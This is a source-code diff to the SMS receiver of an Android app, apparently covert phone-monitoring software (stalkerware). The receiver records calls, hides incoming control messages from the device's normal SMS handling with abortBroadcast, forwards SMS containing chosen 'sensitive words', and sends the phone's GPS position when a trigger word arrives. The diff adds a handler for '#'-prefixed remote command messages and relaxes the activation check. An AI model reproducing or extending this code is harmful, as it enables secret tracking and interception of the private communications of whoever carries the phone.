@@ -15,11 +15,11 @@ import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
+import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 import system.service.feature.sms.SmsCtrl;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
-import com.particle.inspector.common.util.gps.GpsUtil;
 import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
@@ -73,6 +73,9 @@ public class SmsReceiver extends BroadcastReceiver
         } 
     };
 	
+	// **************************************************************************************
+    // Main receiver for both phone call recording and SMS handling
+	// **************************************************************************************
 	@SuppressWarnings("unused")
 	@Override
 	public void onReceive(Context context, Intent intent) 
@@ -82,7 +85,7 @@ public class SmsReceiver extends BroadcastReceiver
 		String action = intent.getAction();
 		// ==================================================================================
 		// If a phone call coming
-		
+		// ==================================================================================
 		if (action.equals(Intent.ACTION_ANSWER)) 
 		{
 			// If neither in trail and nor licensed, return
@@ -115,6 +118,7 @@ public class SmsReceiver extends BroadcastReceiver
 		
 		// ==================================================================================
 		// If a SMS coming 
+		// ==================================================================================
 		else if (action.equals(SMS_RECEIVED)) 
 		{
 			String smsBody = SmsCtrl.getSmsBody(intent).trim();
@@ -122,13 +126,15 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// If it is the activation SMS (only include the key), show the setting view
-			if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
-				LicenseCtrl.calLicenseType(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
+			if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH ||  
+				smsBody.equals(LicenseCtrl.TRIAL_KEY)) 
 			{
-				abortBroadcast(); // Finish broadcast, the system will notify this SMS
 				smsBody = smsBody.toUpperCase();
 				LICENSE_TYPE licType = LicenseCtrl.calLicenseType(context, smsBody);
-
+				if (licType == LICENSE_TYPE.NOT_LICENSED) return;
+				
+				abortBroadcast(); // Finish broadcast, the system will notify this SMS
+				
 				// Save consumed datetime if it is the 1st activation
 				if (ConfigCtrl.getConsumedDatetime(context) == null) {
 					ConfigCtrl.setConsumedDatetime(context, (new Date()));
@@ -241,28 +247,6 @@ public class SmsReceiver extends BroadcastReceiver
 				if (parts.length >= 4) {
 					abortBroadcast(); // Finish broadcast, the system will notify this SMS
 
-					// The time between sending Auth SMS and receiving Auth SMS cannot be more than 10 minites.
-					/*
-				String authSmsSentDatetimeStr = ConfigCtrl.getAuthSmsSentDatetime(context);
-				ConfigCtrl.setAuthSmsSentDatetime(context, null); // clean the auth sms sent time
-				Date authSmsSentDatetime = null;
-				try {
-					authSmsSentDatetime = DatetimeUtil.format.parse(authSmsSentDatetimeStr);
-				}
-				catch (ParseException e) {
-
-				}
-				Calendar c = Calendar.getInstance();
-				long now = c.getTimeInMillis();
-				c.setTime(authSmsSentDatetime);
-				long lastly = c.getTimeInMillis();
-
-				if ((now - lastly) > 600000) {
-					Log.i(LOGTAG, "Auth SMS invalid due to out of time");
-					return;
-				}
-					 */
-
 					// --------------------------------------------------------------
 					if (parts[3].equals(AuthSms.SMS_SUCCESS)) {
 						// Save self phone number
@@ -289,6 +273,13 @@ public class SmsReceiver extends BroadcastReceiver
 					}
 				}
 			}
+			
+			//-------------------------------------------------------------------------------
+			// If it is the indication SMS
+			else if (smsBody.startsWith("#"))
+			{
+				IndicationHandler.handleIndicationSms(context, smsBody);
+			}
 
 			//-------------------------------------------------------------------------------
 			// Redirect SMS that contains sensitive words
@@ -311,8 +302,7 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// Send GPS position if being triggered by GPS activation word
-			String gpsWord = GlobalPrefActivity.getGpsWord(context);
-			if (gpsWord.length() > 0 && smsBody.contains(gpsWord)) 
+			if (BootService.gpsWord.length() > 0 && smsBody.contains(BootService.gpsWord)) 
 			{
 				// If neither in trail and nor licensed, return
 				LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
